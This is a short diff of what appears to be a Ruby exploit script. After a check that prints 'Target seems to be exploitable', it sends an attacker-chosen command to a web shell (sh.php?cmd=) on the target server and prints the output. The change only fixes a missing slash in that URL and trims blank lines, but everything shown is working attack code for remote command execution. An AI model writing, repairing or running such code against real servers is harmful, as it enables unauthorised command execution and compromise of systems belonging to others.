@@ -34,11 +34,6 @@ end
 
 puts "[*] Target seems to be exploitable."
 
-exploit_uri = URI(target+"sh.php?cmd=#{command}")
+exploit_uri = URI(target+"/sh.php?cmd=#{command}")
 response = Net::HTTP.get_response(exploit_uri)
 puts response.body
-
-
-
-
-
